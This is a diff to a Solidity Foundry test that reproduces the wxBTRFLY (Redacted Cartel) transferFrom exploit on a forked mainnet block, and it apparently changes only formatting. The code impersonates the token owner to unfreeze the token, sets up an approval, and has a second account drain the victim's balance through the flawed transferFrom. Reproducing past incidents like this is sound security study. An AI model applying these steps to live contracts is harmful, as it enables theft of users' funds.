@@ -24,19 +24,15 @@ contract RedactedCartelExploit is DSTest {
     address owner = 0x20B92862dcb9976E0AA11fAE766343B7317aB349; //owner of wxBTRFLY token
 
     function setUp() public {
-        cheats.createSelectFork("mainnet", 13908185); //13908185 
-
+        cheats.createSelectFork("mainnet", 13_908_185); //13908185
 
         // cheat.label(address(Alice), "Alice");
         // cheat.label(address(AliceContract), "AliceContract");
         // cheat.label(address(Bob), "Bob");
         // cheat.label(address(owner), "wxBTRFLYOwner");
-
     }
 
     function testExploit() public {
-
-
         //quick hack to bypass the "onlyAuthorisedOperators" modifier
         cheats.prank(owner);
         wxBTRFLY.unFreezeToken();
@@ -48,10 +44,9 @@ contract RedactedCartelExploit is DSTest {
 
         // Step 1: Alice approves an address to spend wxBTRFLY Token on her behalf
         cheats.prank(Alice);
-        wxBTRFLY.approve(AliceContract, 89011248549237373700); // wxBTRFLY.balanceOf(Alice)
+        wxBTRFLY.approve(AliceContract, 89_011_248_549_237_373_700); // wxBTRFLY.balanceOf(Alice)
         console.log("wxBTRFLY Allowance of Alice->AliceContract : ", wxBTRFLY.allowance(Alice, AliceContract));
         console.log("wxBTRFLY Allowance of Alice->Bob(Before transferFrom): ", wxBTRFLY.allowance(Alice, Bob));
-
 
         /*
             Custom vulnerable transferFrom function of wxBTRFLY token
@@ -72,8 +67,8 @@ contract RedactedCartelExploit is DSTest {
 
         //post-hack
         cheats.prank(Bob);
-        wxBTRFLY.transferFrom(Alice, Bob, 89011248549237373700); // wxBTRFLY.balanceOf(Alice)
-        
+        wxBTRFLY.transferFrom(Alice, Bob, 89_011_248_549_237_373_700); // wxBTRFLY.balanceOf(Alice)
+
         console.log("--------------------------------------------------");
         console.log("After the Exploit !");
         console.log("Alice wxBTRFLY Token Balance: ", wxBTRFLY.balanceOf(Alice));
